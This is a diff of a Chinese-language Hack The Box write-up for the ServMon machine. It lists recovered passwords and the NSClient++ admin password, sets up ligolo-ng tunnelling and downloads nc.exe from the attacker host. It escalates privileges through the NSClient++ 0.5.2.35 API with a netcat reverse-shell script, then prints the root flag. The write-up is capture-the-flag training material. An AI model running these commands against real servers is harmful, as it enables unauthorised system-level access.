@@ -1,6 +1,6 @@
 ###### tags: `Hack the box` `HTB` `Easy`
 
-# ServMon(等他跑好一點再用)
+# ServMon(沒root shell)
 ```
 ┌──(kali㉿kali)-[~/htb]
 └─$ rustscan -a 10.129.227.77 -u 5000 -t 8000 --scripts -- -n -Pn -sVC
@@ -183,13 +183,13 @@ timer=timer.drv
 [+] File Content
 
 ++++++++++ BEGIN ++++++++++
-1nsp3ctTh3Way2Mars!                                                         
-Th3r34r3To0M4nyTrait0r5!                                                   
-B3WithM30r4ga1n5tMe                                                         
-L1k3B1gBut7s@W0rk                                                           
-0nly7h3y0unGWi11F0l10w                                                     
-IfH3s4b0Utg0t0H1sH0me                                                       
-Gr4etN3w5w17hMySk1Pa5$                                                     
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
 ++++++++++  END  ++++++++++ 
 ```
 
@@ -220,40 +220,57 @@ nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
 Current password: ew2x6SsGTxjRwXOT
 ```
 
-開`SSH Local Port Forwarding`
+看版本
+```
+nadine@SERVMON C:\Program Files\NSClient++>.\nscp.exe --version
+NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
+```
+
+開`ligolo`
+```
+┌──(kali㉿kali)-[~/ligolo-ng]
+└─$ sudo ip tuntap add user kali mode tun ligolo
+
+┌──(kali㉿kali)-[~/ligolo-ng]
+└─$ sudo ip link set ligolo up
+
+┌──(kali㉿kali)-[~/ligolo-ng]
+└─$ ./proxy -selfcert
+
+PS C:\Temp> iwr http://10.10.14.22/nc.exe -OutFile nc.exe
+PS C:\Temp> iwr http://10.10.14.22/agent_w.exe -OutFile agent.exe
+
+nadine@SERVMON C:\Users\Nadine\Desktop>./agent -connect 10.10.14.22:11601 -ignore-cert
+
+ligolo-ng » session
+? Specify a session : 2 - #2 - SERVMON\Nadine@ServMon - 10.129.17.2:51180
+[Agent : SERVMON\Nadine@ServMon] » start
+[Agent : SERVMON\Nadine@ServMon] » INFO[10400] Starting tunnel to SERVMON\Nadine@ServMon    
+[Agent : SERVMON\Nadine@ServMon] »
+```
+
+這題真的要等他彈回來不知道為什麼nc會一直被刪掉，參考[NSClient-0.5.2.35---Privilege-Escalation
+](https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation/tree/master)
 ```
 ┌──(kali㉿kali)-[~/htb]
-└─$ ssh -L 8443:127.0.0.1:8443 -N nadine@10.129.227.77
-nadine@10.129.227.77's password: L1k3B1gBut7s@W0rk
+└─$ rlwrap -cAr nc -nvlp443
+
+nadine@SERVMON C:\Temp>curl -s -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/shell.bat --data-binar
+y "C:\Temp\nc.exe 10.10.14.22 443 -e cmd.exe"
+Enter host password for user 'admin': ew2x6SsGTxjRwXOT
+
+nadine@SERVMON C:\Users\Nadine>curl -s -k -u admin "https://127.0.0.1:8443/api/v1/queries/shell/commands/execute?time=1s"
+Enter host password for user 'admin': ew2x6SsGTxjRwXOT
 ```
 
-前往`https://127.0.0.1:8443`一定要httpssssssssssssssssssssssss
-輸入密碼登入
-
-![ServMon_1.png](picture/ServMon_1.png)
-
+偷吃步直接印flag`0f4ea1b60b0a84712b26a515f51edbe4`
 ```
-ew2x6SsGTxjRwXOT
-```
-點`Settings`-> `Settings` -> `External Scripts` -> `Scripts` -> `Add new`
+nadine@SERVMON C:\Temp>curl -s -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/type.bat --data-binary "type C
+:\Users\Administrator\Desktop\root.txt"
+Enter host password for user 'admin': ew2x6SsGTxjRwXOT
+Added type as scripts\type.bat
 
-![ServMon_2.png](picture/ServMon_2.png)
-
-```
-┌──(kali㉿kali)-[~/htb]
-└─$ cat evil.bat
-@echo off
-C:\Users\Nadine\Desktop\nc.exe 10.10.14.56 443 -e cmd.exe
-
-PS C:\Users\Nadine\Desktop> iwr http://10.10.14.56/evil.bat -Outfile evil.bat
-PS C:\Users\Nadine\Desktop> iwr http://10.10.14.56/nc.exe -Outfile nc.exe
-```
-
-點`Settings` -> `Scheduler` -> `Schedules`
-
-![ServMon_3.png](picture/ServMon_3.png)
-
-右上角`Control` -> `Reload`
-```
-
+nadine@SERVMON C:\Temp>curl -s -k -u admin "https://127.0.0.1:8443/api/v1/queries/type/commands/execute?time=10s"
+Enter host password for user 'admin':
+{"command":"type","lines":[{"message":"\r\nC:\\Program Files\\NSClient++>type C:\\Users\\Administrator\\Desktop\\root.txt \r\n0f4ea1b60b0a84712b26a515f51edbe4","perf":{}}],"result":0}
 ```
